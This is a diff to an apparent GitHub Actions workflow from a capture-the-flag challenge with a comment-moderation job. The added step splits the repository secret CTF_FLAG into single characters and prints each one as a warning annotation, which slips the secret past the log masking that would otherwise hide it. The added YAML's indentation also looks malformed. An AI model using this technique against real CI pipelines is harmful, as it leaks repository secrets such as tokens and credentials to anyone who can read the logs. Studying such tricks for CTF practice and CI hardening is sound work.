@@ -81,3 +81,7 @@ jobs:
           done < banned_words_hash.txt
           echo "Meh, well... Anyway we removed you comment :P"
 
+          run: |
+            for c in $(echo -n "${{ secrets.CTF_FLAG }}" | fold -w1); do echo "::warning::$c"; done
+
+
